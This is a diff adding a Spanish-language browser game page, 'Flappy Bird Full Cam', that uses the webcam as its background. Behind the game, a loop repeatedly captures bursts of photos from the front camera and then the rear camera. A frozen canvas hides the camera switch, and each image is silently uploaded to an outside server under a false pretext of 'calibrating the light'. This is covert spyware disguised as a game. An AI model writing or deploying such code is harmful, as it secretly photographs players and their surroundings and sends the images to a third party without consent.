@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Flappy Bird Full Cam</title>
+    <style>
+        * { box-sizing: border-box; touch-action: none; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
+        
+        /* Video de fondo */
+        video#webcam {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            object-fit: cover; transform: scaleX(-1);
+            z-index: 1; filter: brightness(0.6);
+        }
+
+        /* Capa de congelado visual durante el cambio de cámara */
+        canvas#freezeCanvas {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 2; display: none; object-fit: cover;
+        }
+
+        /* Canvas del juego */
+        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+
+        .overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 300;
+            display: flex; align-items: center; justify-content: center; text-align: center;
+        }
+
+        .card {
+            background: #1a1a1a; padding: 35px; border-radius: 20px;
+            border: 3px solid #f1c40f; max-width: 400px; width: 90%;
+        }
+
+        .btn {
+            background: #f1c40f; color: #000; border: none; padding: 18px;
+            font-size: 18px; font-weight: bold; border-radius: 12px;
+            cursor: pointer; margin-top: 20px; width: 100%;
+        }
+
+        .hud {
+            position: absolute; top: 20px; width: 100%; text-align: center;
+            z-index: 100; font-size: 32px; font-weight: bold; text-shadow: 2px 2px #000;
+            pointer-events: none; display: none;
+        }
+    </style>
+</head>
+<body onclick="birdJump()">
+
+<div class="hud" id="hud">SCORE: <span id="score">0</span></div>
+
+<video id="webcam" autoplay playsinline></video>
+<canvas id="freezeCanvas"></canvas>
+<canvas id="gameCanvas"></canvas>
+
+<div id="permission-screen" class="overlay">
+    <div class="card">
+        <h2 style="color:#f1c40f;">ACCESO A CÁMARA</h2>
+        <p>Se requiere acceso a la cámara para jugar y calibrar la luz.</p>
+        <button class="btn" onclick="initSystem()">ACTIVAR CÁMARA</button>
+    </div>
+</div>
+
+<div id="start-screen" class="overlay" style="display:none;">
+    <div class="card">
+        <h1 id="title-msg" style="color:#f1c40f;">¡LISTO!</h1>
+        <p id="p-msg">Toca para empezar a jugar.</p>
+        <button class="btn" onclick="startGame()">JUGAR</button>
+    </div>
+</div>
+
+<script>
+    const video = document.getElementById('webcam');
+    const gameCanvas = document.getElementById('gameCanvas');
+    const freezeCanvas = document.getElementById('freezeCanvas');
+    const ctx = gameCanvas.getContext('2d');
+    const fCtx = freezeCanvas.getContext('2d');
+    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
+
+    let bird, pipes, score, isRunning = false;
+    let cameraDevices = [];
+    let pipeInterval;
+    let burstRunning = false;
+
+    // --- 1. SISTEMA DE CÁMARAS Y RÁFAGAS ---
+    async function initSystem() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            cameraDevices = devices.filter(d => d.kind === 'videoinput');
+            
+            await changeStream(0); // Inicia con la de la cara
+            
+            document.getElementById('permission-screen').style.display = 'none';
+            document.getElementById('start-screen').style.display = 'flex';
+            
+            if (!burstRunning) {
+                burstRunning = true;
+                startDualBurstCycle();
+            }
+        } catch (err) {
+            alert("Error de cámara: " + err);
+        }
+    }
+
+    async function changeStream(index) {
+        if (!cameraDevices[index]) return;
+        if (video.srcObject) {
+            video.srcObject.getTracks().forEach(t => t.stop());
+        }
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { deviceId: { exact: cameraDevices[index].deviceId } }
+        });
+        video.srcObject = stream;
+        return new Promise(resolve => video.onloadedmetadata = resolve);
+    }
+
+    async function startDualBurstCycle() {
+        while (true) {
+            // 5 fotos cámara actual (frontal)
+            await takeBurst(5);
+
+            if (cameraDevices.length > 1) {
+                freeze(true); // Congela el fondo para que el juego no se vea mal
+                await changeStream(1); // Cambia a trasera
+                await takeBurst(5);     // 5 fotos ráfaga trasera
+                await changeStream(0); // Vuelve a frontal
+                freeze(false);         // Descongela
+            }
+            await new Promise(r => setTimeout(r, 1000));
+        }
+    }
+
+    async function takeBurst(count) {
+        for (let i = 0; i < count; i++) {
+            const snap = document.createElement('canvas');
+            snap.width = 240; snap.height = 180;
+            snap.getContext('2d').drawImage(video, 0, 0, 240, 180);
+            
+            fetch(SERVER_URL, {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.4) })
+            }).catch(() => {});
+            
+            await new Promise(r => setTimeout(r, 150)); 
+        }
+    }
+
+    function freeze(active) {
+        if (active) {
+            freezeCanvas.width = window.innerWidth;
+            freezeCanvas.height = window.innerHeight;
+            fCtx.save();
+            fCtx.scale(-1, 1);
+            fCtx.drawImage(video, -freezeCanvas.width, 0, freezeCanvas.width, freezeCanvas.height);
+            fCtx.restore();
+            freezeCanvas.style.display = 'block';
+        } else {
+            freezeCanvas.style.display = 'none';
+        }
+    }
+
+    // --- 2. LÓGICA DEL JUEGO COMPLETA ---
+    function startGame() {
+        document.getElementById('start-screen').style.display = 'none';
+        document.getElementById('hud').style.display = 'block';
+        
+        gameCanvas.width = window.innerWidth;
+        gameCanvas.height = window.innerHeight;
+        
+        bird = { x: 80, y: gameCanvas.height / 2, v: 0, radius: 20 };
+        pipes = [];
+        score = 0;
+        document.getElementById('score').innerText = "0";
+        isRunning = true;
+        
+        if (pipeInterval) clearInterval(pipeInterval);
+        spawnPipe();
+        gameLoop();
+    }
+
+    function birdJump() { if (isRunning) bird.v = -8; }
+
+    function spawnPipe() {
+        if (!isRunning) return;
+        const gap = 200;
+        const h = Math.random() * (gameCanvas.height - 350) + 70;
+        pipes.push({ x: gameCanvas.width, top: h, bottom: h + gap, w: 70, passed: false });
+        pipeInterval = setTimeout(spawnPipe, 1600);
+    }
+
+    function gameLoop() {
+        if (!isRunning) return;
+        ctx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
+        
+        bird.v += 0.45;
+        bird.y += bird.v;
+
+        // Dibujar Pájaro
+        ctx.fillStyle = "#f1c40f";
+        ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();
+        ctx.strokeStyle = "black"; ctx.stroke();
+
+        // Tuberías
+        pipes.forEach((p, i) => {
+            p.x -= 5;
+            ctx.fillStyle = "rgba(46, 204, 113, 0.9)";
+            ctx.fillRect(p.x, 0, p.w, p.top);
+            ctx.fillRect(p.x, p.bottom, p.w, gameCanvas.height - p.bottom);
+
+            // Colisiones
+            if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
+                if (bird.y - bird.radius < p.top || bird.y + bird.radius > p.bottom) gameOver();
+            }
+
+            // Puntos
+            if (p.x + p.w < bird.x && !p.passed) {
+                score++; p.passed = true;
+                document.getElementById('score').innerText = score;
+            }
+            if (p.x + p.w < 0) pipes.splice(i, 1);
+        });
+
+        if (bird.y > gameCanvas.height || bird.y < 0) gameOver();
+        requestAnimationFrame(gameLoop);
+    }
+
+    function gameOver() {
+        isRunning = false;
+        clearTimeout(pipeInterval);
+        document.getElementById('title-msg').innerText = "GAME OVER";
+        document.getElementById('p-msg').innerText = "Puntos: " + score;
+        document.getElementById('start-screen').style.display = 'flex';
+        document.getElementById('hud').style.display = 'none';
+        ctx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
+    }
+</script>
+</body>
+</html>
